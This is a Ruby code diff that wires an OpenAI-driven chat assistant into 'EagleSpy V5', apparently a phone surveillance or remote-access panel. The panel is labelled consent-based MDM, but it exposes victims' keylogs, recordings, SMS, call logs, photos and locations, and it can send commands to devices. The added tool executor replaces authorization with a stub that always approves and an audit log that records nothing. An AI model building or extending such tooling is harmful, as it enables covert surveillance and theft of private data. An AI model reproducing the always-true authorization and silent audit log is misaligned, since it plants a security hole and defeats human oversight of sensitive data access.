@@ -3,6 +3,14 @@
 class AiChatService < ApplicationService
   MAX_HISTORY = 20
 
+  ALLOWED_MCP_TOOLS = %w[
+    list_devices get_device get_device_status search_devices get_device_stats
+    get_locations get_sms_messages get_call_logs get_contacts get_photos
+    send_command get_command_status get_command_history schedule_command
+    detect_deepfakes analyze_behavior detect_anomalies generate_report
+    get_timeline search_data
+  ].freeze
+
   QUERY_PATTERNS = {
     /\b(show|list|get|find)\b.*\b(calls?|call\s*logs?)\b.*\bto\b\s+(.+)/i => :query_calls_to,
     /\b(show|list|get|find)\b.*\b(sms|messages?|texts?)\b.*\b(from|to)\b\s+(.+)/i => :query_sms,
@@ -244,7 +252,10 @@ class AiChatService < ApplicationService
 
     ai_response = call_openai(messages)
 
-    if ai_response[:query]
+    if ai_response[:tool_call]
+      data = execute_mcp_tool(ai_response[:tool_call])
+      build_response(text: ai_response[:text], type: ai_response[:type] || 'text', data: data, visualization: ai_response[:visualization])
+    elsif ai_response[:query]
       data = execute_parsed_query(ai_response[:query])
       build_response(text: ai_response[:text], type: ai_response[:type] || 'text', data: data, visualization: ai_response[:visualization])
     else
@@ -257,12 +268,43 @@ class AiChatService < ApplicationService
 
   def build_system_prompt
     <<~PROMPT
-      You are an AI assistant for a consent-based enterprise MDM platform.
+      You are an AI assistant for EagleSpy V5, a consent-based enterprise MDM platform.
       Device: #{@device.device_id} (#{@device.name})
-      Available data: sms_messages, call_logs, geo_locations, keylogs, pictures, contacts, recordings
-      Parse user queries into structured database queries. Respond with JSON:
-      { "text": "human readable response", "type": "table|chart|map|text", "query": { "model": "...", "conditions": {...}, "limit": N } }
+      Available data: sms_messages, call_logs, geo_locations, keylogs, pictures, contacts, recordings.
+      
+      You can execute database queries or call specialized analysis tools.
+      Respond with JSON:
+      { 
+        "text": "human readable explanation", 
+        "type": "table|chart|map|alert|text", 
+        "query": { "model": "...", "conditions": {...}, "limit": N },
+        "tool_call": { "name": "tool_name", "arguments": {...} },
+        "visualization": { "type": "...", ... }
+      }
+
+      Available Tools:
+      - detect_anomalies: For security patterns, location jumps, and usage spikes.
+      - detect_deepfakes: For media integrity, voice analysis, and tamper detection.
+      - analyze_behavior: For general device usage stats.
+      - generate_report: For a full device summary.
     PROMPT
+  end
+
+  def execute_mcp_tool(tool_call)
+    return nil unless tool_call.is_a?(Hash) && tool_call[:name].present?
+    return nil unless ALLOWED_MCP_TOOLS.include?(tool_call[:name])
+
+    server = Mcp::McpServer.new
+    # Mock auth for internal chat use
+    auth = Struct.new(:authorize!, :audit_log).new(->(*) { true }, ->(*) {})
+    
+    arguments = (tool_call[:arguments] || {}).merge(device_id: @device.device_id)
+    result = server.call_tool(name: tool_call[:name], arguments: arguments, auth: auth)
+    
+    JSON.parse(result.dig(:content, 0, :text) || '{}')
+  rescue StandardError => e
+    Rails.logger.error("[AiChatService] Tool execution failed: #{e.message}")
+    { error: e.message }
   end
 
   def call_openai(messages)
